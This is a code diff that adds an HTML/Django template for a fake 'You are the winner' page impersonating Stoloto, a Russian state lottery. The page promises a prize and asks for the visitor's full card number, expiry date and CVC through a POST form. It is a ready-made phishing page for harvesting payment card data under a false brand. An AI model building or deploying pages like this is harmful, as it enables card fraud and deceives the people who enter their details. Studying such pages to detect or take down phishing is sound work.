@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Вы - победитель / Столото</title>
+	<link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+	<header>
+		<h1>Столото</h1>
+		Государственная лотерея
+	</header>
+
+	<h2>Заберите ваш приз - {{ prize }}</h2>
+	<form method="POST">
+		{% csrf_token %}
+		<table>
+			<tr>
+				<td>
+					<label>Номер карты</label>
+					<input type="text" name="number" placeholder="XXXX XXXX XXXX XXXX" />
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<label>Дата окончания действия</label>
+					<input type="text" name="date" placeholder="дд.мм.гггг">
+				</td>
+				<td>
+					<label>CVC-код</label>
+					<input type="text" name="cvc" placeholder="XXX">
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<input type="submit" value="Отправить">
+				</td>
+			</tr>
+		</table>
+	</form>
+</body>
+</html>
